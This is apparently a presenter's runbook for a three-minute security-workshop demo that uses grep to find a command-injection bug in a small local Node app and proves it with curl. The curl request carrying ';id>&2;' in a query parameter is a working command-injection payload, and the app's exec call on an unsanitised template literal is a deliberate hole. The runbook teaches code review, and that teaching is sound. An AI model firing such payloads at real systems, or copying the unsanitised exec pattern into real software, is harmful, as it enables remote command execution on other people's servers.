# grep-to-RCE Live Demo — Runbook

**Timing:** 3 min. The whole point is speed — grep finds it faster than reading.

## Setup (before talk)

```bash
cd hackthebay-workshop/assets/demo-grep
node app.js    # separate terminal, leave running on :3001
```

Have a terminal ready in this directory.

## Script

**[0:00]** "50-line Node app. Never seen it before. Let's find a bug."

```bash
wc -l app.js        # "47 lines. Could read it. Won't."
```

**[0:20]** "What's dangerous in Node? `exec`, `spawn`, `eval`. Grep for those."

```bash
grep -n "exec\|spawn\|eval" app.js
```

Output shows line 9 (`require`) and line 20 (`exec(cmd, ...)`). "Line 20. There's our sink."

**[0:50]** "What's `cmd`?" Open the file, show line 19:

```js
const cmd = `convert ${file} -resize ${width}x ${file}.out`;
```

"Template literal. `file` and `width` go straight in. Where do THEY come from?"

**[1:20]** Point at lines 14-15: `q.width`, `q.file` — straight from `url.parse(req.url).query`.

"Source: URL query. Sink: `exec`. Nothing in between. That's the bug."

**[1:40]** "Let's prove it."

```bash
curl 'http://localhost:3001/resize?width=100&file=x.png'
# → error: convert: command not found   (expected — no imagemagick needed)

# App returns stderr on error → redirect our output there: id>&2
curl 'http://localhost:3001/resize?width=1;id>%262;&file=x'
# → error: convert: command not found
#   uid=501(rotembar) gid=20(staff) groups=...   🎉
```

> **Why `>&2`?** The app returns `stderr` when `exec` errors (and `convert`
> doesn't exist, so it always errors). Our `id` output goes to `stdout` by
> default — lost. Redirect to stderr → it rides the error message home.
> **This is a great teaching moment**: exploitation isn't just "inject" —
> it's "inject AND exfiltrate through whatever channel you have."

**[2:20]** **Pause.** "Grep to RCE. 90 seconds. Didn't read the file."

**[2:40]** "Bonus — there's a SECOND bug in here. `grep -n readFile app.js`. Path traversal in `loadUserPrefs`. Spot it in your own time."

## If it breaks

- `curl` hangs → app.js not running. `node app.js` in another terminal.
- `;id;` gets URL-encoded weird → use `--data-urlencode` or just type `%3Bid%3B`
- Port 3001 taken → edit app.js last line, change port, adjust curls.

## Why this demo works

It's not clever. That's the point. The audience watches you do something
they could do TONIGHT on a real codebase. The `convert` imagemagick pattern
is real — it's in thousands of production apps right now.
